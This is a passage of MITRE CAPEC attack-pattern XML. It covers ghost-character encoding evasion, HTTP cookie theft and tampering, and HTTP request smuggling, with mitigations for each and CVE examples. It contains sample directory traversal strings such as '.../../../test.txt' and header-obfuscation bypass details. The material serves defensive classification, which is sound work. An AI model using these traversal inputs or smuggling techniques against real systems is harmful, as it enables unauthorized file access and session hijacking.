         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The targeted API must ignore the leading ghost characters that are used to get past the filters for the semantics to be the same.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">The ability to make an API request, and knowledge of "ghost" characters that will not be filtered by any input validation. These "ghost" characters must be known to not affect the way in which the request will be interpreted.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Use an allowlist rather than a denylist input validation.</ns0:Mitigation>
            <ns0:Mitigation>Canonicalize all data prior to validation.</ns0:Mitigation>
            <ns0:Mitigation>Take an iterative approach to input validation (defense in depth).</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>Alternate Encoding with Ghost Characters in FTP and Web Servers</html:p>
               <html:p>Some web and FTP servers fail to detect prohibited upward directory traversals if the user-supplied pathname contains extra characters such as an extra leading dot. For example, a program that will disallow access to the pathname "../test.txt" may erroneously allow access to that file if the pathname is specified as ".../test.txt". This attack succeeds because 1) the input validation logic fails to detect the triple-dot as a directory traversal attempt (since it isn't dot-dot), 2) some part of the input processing decided to strip off the "extra" dot, leaving the dot-dot behind.</html:p>
               <html:p>Using the file system API as the target, the following strings are all equivalent to many programs:</html:p>
               <html:div style="margin-left:1em;" class="informative">.../../../test.txt<html:br />............/../../test.txt<html:br />..?/../../test.txt<html:br />..????????/../../test.txt<html:br />../test.txt</html:div>
               <html:p>As you can see, there are many ways to make a semantically equivalent request. All these strings ultimately result in a request for the file ../test.txt.</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="173" />
            <ns0:Related_Weakness CWE_ID="41" />
            <ns0:Related_Weakness CWE_ID="172" />
            <ns0:Related_Weakness CWE_ID="179" />
            <ns0:Related_Weakness CWE_ID="180" />
            <ns0:Related_Weakness CWE_ID="181" />
            <ns0:Related_Weakness CWE_ID="183" />
            <ns0:Related_Weakness CWE_ID="184" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="74" />
            <ns0:Related_Weakness CWE_ID="697" />
            <ns0:Related_Weakness CWE_ID="707" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-11-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-01</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases, Description Summary, Payload</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases, Attacker_Skills_or_Knowledge_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="31" Name="Accessing/Intercepting/Modifying HTTP Cookies" Abstraction="Detailed" Status="Draft">
         <ns0:Description>This attack relies on the use of HTTP Cookies to store credentials, state information and other critical data on client systems. There are several different forms of this attack. The first form of this attack involves accessing HTTP Cookies to mine for potentially sensitive data contained therein. The second form involves intercepting this data as it is transmitted from client to server. This intercepted information is then used by the adversary to impersonate the remote user/session. The third form is when the cookie's content is modified by the adversary before it is sent back to the server. Here the adversary seeks to convince the target server to operate on this falsified information.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="39" />
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="157">
               <ns0:Exclude_Related Exclude_ID="513" />
            </ns0:Related_Attack_Pattern>
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Obtain copy of cookie] The adversary first needs to obtain a copy of the cookie. The adversary may be a legitimate end user wanting to escalate privilege, or could be somebody sniffing on a network to get a copy of HTTP cookies.</ns0:Description>
               <ns0:Technique>Sniff cookie using a network sniffer such as Wireshark</ns0:Technique>
               <ns0:Technique>Obtain cookie using a utility such as the Firefox Cookie Manager, Chrome DevTools or AnEC Cookie Editor.</ns0:Technique>
               <ns0:Technique>Steal cookie via a cross-site scripting attack.</ns0:Technique>
               <ns0:Technique>Guess cookie contents if it contains predictable information.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Obtain sensitive information from cookie] The adversary may be able to get sensitive information from the cookie. The web application developers may have assumed that cookies are not accessible by end users, and thus, may have put potentially sensitive information in them.</ns0:Description>
               <ns0:Technique>If cookie shows any signs of being encoded using a standard scheme such as base64, decode it.</ns0:Technique>
               <ns0:Technique>Analyze the cookie's contents to determine whether it contains any sensitive information.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Modify cookie to subvert security controls.] The adversary may be able to modify or replace cookies to bypass security controls in the application.</ns0:Description>
               <ns0:Technique>Modify logical parts of cookie and send it back to server to observe the effects.</ns0:Technique>
               <ns0:Technique>Modify numeric parts of cookie arithmetically and send it back to server to observe the effects.</ns0:Technique>
               <ns0:Technique>Modify cookie bitwise and send it back to server to observe the effects.</ns0:Technique>
               <ns0:Technique>Replace cookie with an older legitimate cookie and send it back to server to observe the effects. This technique would be helpful in cases where the cookie contains a "points balance" for a given user where the points have some value. The user may spend their points and then replace their cookie with an older one to restore their balance.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>Target server software must be a HTTP daemon that relies on cookies.</ns0:Prerequisite>
            <ns0:Prerequisite>The cookies must contain sensitive information.</ns0:Prerequisite>
            <ns0:Prerequisite>The adversary must be able to make HTTP requests to the server, and the cookie must be contained in the reply.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">To overwrite session cookie data, and submit targeted attacks via HTTP</ns0:Skill>
            <ns0:Skill Level="High">Exploiting a remote buffer overflow generated by attack</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>A utility that allows for the viewing and modification of cookies. Many modern web browsers support this behavior.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Design: Use input validation for cookies</ns0:Mitigation>
            <ns0:Mitigation>Design: Generate and validate MAC for cookies</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Use SSL/TLS to protect cookie in transit</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Ensure the web server implements all relevant security patches, many exploitable buffer overflows are fixed in patches issued for the software.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>There are two main attack vectors for exploiting poorly protected session variables like cookies. One is the local machine itself which can be exploited directly at the physical level or indirectly through XSS and phishing. In addition, the adversary in the middle attack (CAPEC-94) relies on a network sniffer, proxy, or other intermediary to intercept the subject's credentials and use them to impersonate the digital subject on the host. The issue is that once the credentials are intercepted, impersonation is trivial for the adversary to accomplish if no other protection mechanisms are in place. See also: CVE-2010-5148 , CVE-2016-0353</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="565" />
            <ns0:Related_Weakness CWE_ID="302" />
            <ns0:Related_Weakness CWE_ID="311" />
            <ns0:Related_Weakness CWE_ID="113" />
            <ns0:Related_Weakness CWE_ID="539" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="315" />
            <ns0:Related_Weakness CWE_ID="384" />
            <ns0:Related_Weakness CWE_ID="472" />
            <ns0:Related_Weakness CWE_ID="602" />
            <ns0:Related_Weakness CWE_ID="642" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1539</ns0:Entry_ID>
               <ns0:Entry_Name>Steal Web Session Cookie</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-1" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-09</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Payload_Activation_Impact, Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances, Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="33" Name="HTTP Request Smuggling" Abstraction="Detailed" Status="Stable">
         <ns0:Description>
            <html:p>An adversary abuses the flexibility and discrepancies in the parsing and interpretation of HTTP Request messages using various HTTP headers, request-line and body parameters as well as message sizes (denoted by the end of message signaled by a given HTTP header) by different intermediary HTTP agents (e.g., load balancer, reverse proxy, web caching proxies, application firewalls, etc.) to secretly send unauthorized and malicious HTTP requests to a back-end HTTP agent (e.g., web server).</html:p>
            <html:p>See CanPrecede relationships for possible consequences.</html:p>
         </ns0:Description>
         <ns0:Extended_Description>
            <html:p>A maliciously crafted HTTP request, which contains a second secretly embedded HTTP request is interpreted by an intermediary web proxy as single benign HTTP request, is forwarded to a back-end server, that interprets and parses the HTTP request as two authorized benign HTTP requests bypassing security controls.</html:p>
            <html:p>This attack usually involves the misuse of the HTTP headers: Content-Length and Transfer-Encoding. These abuses are discussed in RFC 2616 #4.4.3 and section #4.2 and are related to ordering and precedence of these headers. [REF-38]</html:p>
            <html:p>Additionally this attack can be performed through modification and/or fuzzing of parameters composing the request-line of HTTP messages.</html:p>
            <html:p>This attack is usually the result of the usage of outdated or incompatible HTTP protocol versions in the HTTP agents.</html:p>
            <html:p>This differs from CAPEC-273 HTTP Response Smuggling, which is usually an attempt to compromise a client agent (e.g., web browser) by sending malicious content in HTTP responses from back-end HTTP infrastructure. HTTP Request Smuggling is an attempt to compromise a<html:i>back-end HTTP agent</html:i>via HTTP Request messages.</html:p>
            <html:p>HTTP Splitting (CAPEC-105 and CAPEC-34) is different from HTTP Smuggling due to the fact that during implementation of asynchronous requests, HTTP Splitting requires the embedding/injection of arbitrary HTML headers and content through user input into browser cookies or Ajax web/browser object parameters like XMLHttpRequest.</html:p>
         </ns0:Extended_Description>
         <ns0:Alternate_Terms>
            <ns0:Alternate_Term>
               <ns0:Term>HTTP Desync</ns0:Term>
               <ns0:Description>Modification/manipulation of HTTP message headers, request-line and body parameters to disrupt and interfere in the interpretation and parsing of HTTP message lengths/boundaries for consecutive HTTP messages by HTTP agents in a HTTP chain or network path.</ns0:Description>
            </ns0:Alternate_Term>
         </ns0:Alternate_Terms>
         <ns0:Likelihood_Of_Attack>Medium</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="220" />
            <ns0:Related_Attack_Pattern Nature="PeerOf" CAPEC_ID="273" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="115" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="141" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="63" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="593" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="148" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="154" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey network to identify target] The adversary performs network reconnaissance by monitoring relevant traffic to identify the network path and parsing of the HTTP messages with the goal of identifying potential targets.</ns0:Description>
               <ns0:Technique>Scan networks to fingerprint HTTP infrastructure and monitor HTTP traffic to identify HTTP network path with a tool such as a Network Protocol Analyzer.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Identify vulnerabilities in targeted HTTP infrastructure and technologies] The adversary sends a variety of benign/ambiguous HTTP requests to observe responses from HTTP infrastructure in order to identify differences/discrepancies in the interpretation and parsing of HTTP requests by examining supported HTTP protocol versions, message sizes, and HTTP headers.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Cause differential HTTP responses by experimenting with identified HTTP Request vulnerabilities] The adversary sends maliciously crafted HTTP requests to interfere with the parsing of intermediary and back-end HTTP infrastructure, followed by normal/benign HTTP request from the adversary or a random user. The intended consequences of the malicious HTTP requests will be observed in the HTTP infrastructure response to the normal/benign HTTP request to confirm applicability of identified vulnerabilities in the adversary's plan of attack.</ns0:Description>
               <ns0:Technique>Continue the monitoring of HTTP traffic.</ns0:Technique>
               <ns0:Technique>
                  <html:p>Utilize various combinations of HTTP Headers within a single HTTP Request such as: Content-Length &amp; Transfer-Encoding (CL;TE), Transfer-Encoding &amp; Content-Length (TE;CL), or double Transfer-Encoding (TE;TE), so that additional embedded requests or data in the body of the original request are unprocessed and treated as part of subsequent requests by the intended target HTTP agent.</html:p>
                  <html:p>From these HTTP Header combinations the adversary observes any timing delays (usually in the form of HTTP 404 Error response) or any other unintended consequences.</html:p>
                  <html:ul>
                     <html:li>For CL;TE and TE;CL HTTP header combinations, the first HTTP agent, in the HTTP message path that receives the HTTP request, takes precedence or only processes one header but not the other, while the second/final HTTP agent processes the opposite header, allowing for embedded HTTP requests to be ignored and smuggled to the intended target HTTP agent.</html:li>
                     <html:li>For TE;TE HTTP headers combination, all HTTP agents in HTTP message path process Transfer-Encoding header, however, adversary obfuscation (see Mitigations for details) of one of the Transfer-Encoding headers, by not adhering strictly to the protocol specification, can cause it to be unprocessed/ignored by a designated HTTP agent, hence allowing embedded HTTP requests to be smuggled. .</html:li>
                  </html:ul>
               </ns0:Technique>
               <ns0:Technique>
                  <html:p>Construct a very large HTTP request using multiple Content-Length headers of various data lengths that can potentially cause subsequent requests to be ignored by an intermediary HTTP agent (firewall) and/or eventually parsed separately by the target HTTP agent (web server).</html:p>
                  <html:p>Note that most modern HTTP infrastructure reject HTTP requests with multiple Content-Length headers.</html:p>
               </ns0:Technique>
               <ns0:Technique>Follow an unrecognized (sometimes a RFC compliant) HTTP header with a subsequent HTTP request to potentially cause the HTTP request to be ignored and interpreted as part of the preceding HTTP request.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Perform HTTP Request Smuggling attack] Using knowledge discovered in the experiment section above, smuggle a message to cause one of the consequences.</ns0:Description>
               <ns0:Technique>Leverage techniques identified in the Experiment Phase.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>An additional intermediary HTTP agent such as an application firewall or a web caching proxy between the adversary and the second agent such as a web server, that sends multiple HTTP messages over same network connection.</ns0:Prerequisite>
            <ns0:Prerequisite>Differences in the way the two HTTP agents parse and interpret HTTP requests and its headers.</ns0:Prerequisite>
            <ns0:Prerequisite>HTTP agents running on HTTP/1.1 that allow for Keep Alive mode, Pipelined queries, and Chunked queries and responses.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">Detailed knowledge on HTTP protocol: request and response messages structure and usage of specific headers.</ns0:Skill>
            <ns0:Skill Level="Medium">Detailed knowledge on how specific HTTP agents receive, send, process, interpret, and parse a variety of HTTP messages and headers.</ns0:Skill>
            <ns0:Skill Level="Medium">Possess knowledge on the exact details in the discrepancies between several targeted HTTP agents in path of an HTTP message in parsing its message structure and individual headers.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>Tools capable of crafting malicious HTTP messages and monitoring HTTP message responses.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Indicators>
            <ns0:Indicator>Differences in requests processed by the two agents. This requires careful monitoring or a capable log analysis tool.</ns0:Indicator>
         </ns0:Indicators>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Design: evaluate HTTP agents prior to deployment for parsing/interpretation discrepancies.</ns0:Mitigation>
            <ns0:Mitigation>Configuration: front-end HTTP agents notice ambiguous requests.</ns0:Mitigation>
            <ns0:Mitigation>Configuration: back-end HTTP agents reject ambiguous requests and close the network connection.</ns0:Mitigation>
            <ns0:Mitigation>Configuration: Disable reuse of back-end connections.</ns0:Mitigation>
            <ns0:Mitigation>Configuration: Use HTTP/2 for back-end connections.</ns0:Mitigation>
            <ns0:Mitigation>Configuration: Use the same web server software for front-end and back-end server.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Utilize a Web Application Firewall (WAF) that has built-in mitigation to detect abnormal requests/responses.</ns0:Mitigation>
            <ns0:Mitigation>Configuration: Prioritize Transfer-Encoding header over Content-Length, whenever an HTTP message contains both.</ns0:Mitigation>
            <ns0:Mitigation>Configuration: Disallow HTTP messages with both Transfer-Encoding and Content-Length or Double Content-Length Headers.</ns0:Mitigation>
            <ns0:Mitigation>Configuration: Disallow Malformed/Invalid Transfer-Encoding Headers used in obfuscation, such as:<html:ul>
                  <html:li>Headers with no space before the value &#8220;chunked&#8221;</html:li>
                  <html:li>Headers with extra spaces</html:li>
                  <html:li>Headers beginning with trailing characters</html:li>
                  <html:li>Headers providing a value &#8220;chunk&#8221; instead of &#8220;chunked&#8221; (the server normalizes this as chunked encoding)</html:li>
                  <html:li>Headers with multiple spaces before the value &#8220;chunked&#8221;</html:li>
                  <html:li>Headers with quoted values (whether single or double quotations)</html:li>
                  <html:li>Headers with CRLF characters before the value &#8220;chunked&#8221;</html:li>
                  <html:li>Values with invalid characters</html:li>
               </html:ul>
            </ns0:Mitigation>
            <ns0:Mitigation>Configuration: Install latest vendor security patches available for both intermediary and back-end HTTP infrastructure (i.e. proxies and web servers)</ns0:Mitigation>
            <ns0:Mitigation>Configuration: Ensure that HTTP infrastructure in the chain or network path utilize a strict uniform parsing process.</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Utilize intermediary HTTP infrastructure capable of filtering and/or sanitizing user-input.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>When using Haproxy 1.5.3 version as front-end proxy server with with Node.js version 14.13.1 or 12.19.0 as the back-end web server it is possible to use two same header fields for example: two Transfer-Encoding, Transfer-Encoding: chunked and Transfer-Encoding: chunked-false, to bypass Haproxy /flag URI restriction and receive the Haproxy flag value, since Node.js identifies the first header but ignores the second header. See also: CVE-2020-8287</html:p>
            </ns0:Example>
            <ns0:Example>
               <html:p>When using Sun Java System Web Proxy Server 3.x or 4.x in conjunction with Sun ONE/iPlanet 6.x, Sun Java System Application Server 7.x or 8.x, it is possible to bypass certain application firewall protections, hijack web sessions, perform Cross Site Scripting or poison the web proxy cache using HTTP Request Smuggling. Differences in the way HTTP requests are parsed by the Proxy Server and the Application Server enable malicious requests to be smuggled through to the Application Server, thereby exposing the Application Server to aforementioned attacks. See also: CVE-2006-6276</html:p>
            </ns0:Example>
            <ns0:Example>
               <html:p>Apache server 2.0.45 and version before 1.3.34, when used as a proxy, easily lead to web cache poisoning and bypassing of application firewall restrictions because of non-standard HTTP behavior. Although the HTTP/1.1 specification clearly states that a request with both "Content-Length" and a "Transfer-Encoding: chunked" headers is invalid, vulnerable versions of Apache accept such requests and reassemble the ones with "Transfer-Encoding: chunked" header without replacing the existing "Content-Length" header or adding its own. This leads to HTTP Request Smuggling using a request with a chunked body and a header with "Content-Length: 0". See also: CVE-2005-2088</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="444" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>26</ns0:Entry_ID>
               <ns0:Entry_Name>HTTP Request Smuggling</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-38" />
            <ns0:Reference External_Reference_ID="REF-117" />
            <ns0:Reference External_Reference_ID="REF-617" />
            <ns0:Reference External_Reference_ID="REF-672" />
            <ns0:Reference External_Reference_ID="REF-673" />
            <ns0:Reference External_Reference_ID="REF-674" />
            <ns0:Reference External_Reference_ID="REF-678" />
            <ns0:Reference External_Reference_ID="REF-681" />
            <ns0:Reference External_Reference_ID="REF-682" />
            <ns0:Reference External_Reference_ID="REF-683" />
            <ns0:Reference External_Reference_ID="REF-684" />
         </ns0:References>
         <ns0:Notes>
            <ns0:Note Type="Terminology">HTTP Splitting &#8211; "the act of forcing a sender of (HTTP) messages to emit data stream consisting of more messages than the sender&#8217;s intension. The messages sent are 100% valid and RFC compliant" [REF-117].</ns0:Note>
            <ns0:Note Type="Terminology">HTTP Smuggling &#8211; "the act of forcing a sender of (HTTP) messages to emit data stream which may be parsed as a different set of messages (i.e. dislocated message boundaries) than the sender&#8217;s intention. This is done by virtue of forcing the sender to emit non-standard messages which can be interpreted in more than one way" [REF-117].</ns0:Note>
            <ns0:Note Type="Relationship">HTTP Smuggling is an evolution of previous HTTP Splitting techniques which are commonly remediated against.</ns0:Note>
         </ns0:Notes>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
